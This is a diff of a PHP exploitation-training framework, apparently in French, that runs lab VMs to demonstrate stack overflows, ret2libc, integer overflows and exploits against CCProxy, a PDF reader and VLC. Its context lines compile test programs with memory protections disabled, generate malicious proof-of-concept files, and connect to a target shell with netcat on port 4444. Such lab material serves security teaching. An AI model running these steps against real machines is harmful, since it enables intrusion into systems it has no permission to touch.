@@ -93,7 +93,7 @@ streadd() et strtrns()" );
 	    $attacker_port = $this->proxy_port_burp;
 	    $file_path_output = "test";
 	    $snapshot = "test";
-	    $malware = new malware4win($target_vmx_name, $target_ip, $target_port, $attacker_ip, $attacker_port, $file_path_output, $snapshot);
+	    //$malware = new malware4win($target_vmx_name, $target_ip, $target_port, $attacker_ip, $attacker_port, $file_path_output, $snapshot);
 	    $malware->question("est il possible de prendre le controle d'une machine a partir d'une image , d'un pdf ou d'un fichier MP3 ?");
 	    $malware->bof2exp4app4local2pdf("$this->dir_tmp/poc_doc.pdf");$this->pause();
 	    $malware->bof2exp4app4local2vlc("$this->dir_tmp/poc_vlc.s3m");$this->pause();
@@ -161,7 +161,7 @@ TJAwpCifrLpx1myEg4kz4OhvWk5cL9qV8SP48T0aBoXHtUZFHa6KBNUpoV8QMhyI
 	    $flag_poc = FALSE;
 	    //$flag_poc = TRUE;
 	    
-	    $test = new SERVICE4COM($eth,$domain,$ip, $port, $protocol);
+	    $test = new SERVICE($eth,$domain,$ip, $port, $protocol);
 	    $test->poc($flag_poc);
 	    $test->key2gen4public("", 10, $private_key_file, $public_key_file, $private_key_passwd);
 	    
@@ -1932,7 +1932,7 @@ bypass NX = bypass stack executable = + shellcode non exec in stack -> libc(buil
 		$this->note("Remove -z execstack");
 	
 		/*
-		$vm_ub12042 = new vm("$this->dir_vm/ub12042/ub12042.vmx");
+		$vm_ub12042 = new VM("$this->dir_vm/ub12042/ub12042.vmx");
 		$vm_ub12042->vm2upload("$this->dir_c/ret2libc32l.c","/tmp/ret2libc32l.c");
 		$this->cmd("ub12042","gcc /tmp/ret2libc32l.c -o /tmp/ret2libc32l -w -fno-pie -z norelro -ggdb -fno-stack-protector  -m32 -mtune=i386 -static ");
 		$this->pause();
@@ -2452,7 +2452,7 @@ signedness bugs, particularly network daemons and, frequently, in operating syst
 	
 	
 		$vmx = "$this->dir_vm/Hack.vlan/xp3/xp3.vmx";
-		$vm = new vm($vmx);
+		$vm = new VM($vmx);
 		$this->ssTitre("CCPROXY"); // OK
 		$vm->vm2upload("$this->dir_install/Win/Bof/ret2int/ret2int4win_CCProxy_7.3.zip","$this->vm_tmp_win\\ret2int4win_CCProxy_7.3.zip");
 		$this->pause();
@@ -2463,7 +2463,7 @@ signedness bugs, particularly network daemons and, frequently, in operating syst
 		// OK
 		$this->requette("gedit $this->dir_c/root_ok_integer_overflow.c" );
 		$vmx = "$this->dir_vm/Hack.vlan/ub910/ub910.vmx";
-		$vm = new vm($vmx);
+		$vm = new VM($vmx);
 		$vm->vm2upload("$this->dir_c/root_ok_integer_overflow.c","$this->vm_tmp_lin/root_ok_integer_overflow.c");
 		$this->cmd($this->ub910, "gcc root_ok_integer_overflow.c -o root_ok_integer_overflow " );
 		$this->pause();
@@ -3495,7 +3495,7 @@ des dépassements de tampon n'impliquant pas des chaines de caractères.");
 
 	    $this->cmd("localhost", "nc $this->xp3 4444 -v"); // pause();
 	     
-	     $vm_xp3 = new vm($vmx);
+	     $vm_xp3 = new VM($vmx);
 	    // $vm_xp3->vm2upload("$this->dir_c/ret2stack32wa.c","$this->vm_tmp_win\\ret2stack32wa.c");
 	    // $this->cmd("$this->xp3","gcc /tmp/ret2stack32wa.c -o /tmp/ret2stack32wa -w -ggdb -fno-pie -z norelro -z execstack -ggdb -fno-stack-protector  -m32 -mtune=i386 -static ");$this->pause();
 	    // $vm_xp3->vm2download("$this->vm_tmp_win\\ret2stack32wa.exe", "$this->dir_tmp/ret2stack32wa.exe");$this->pause();
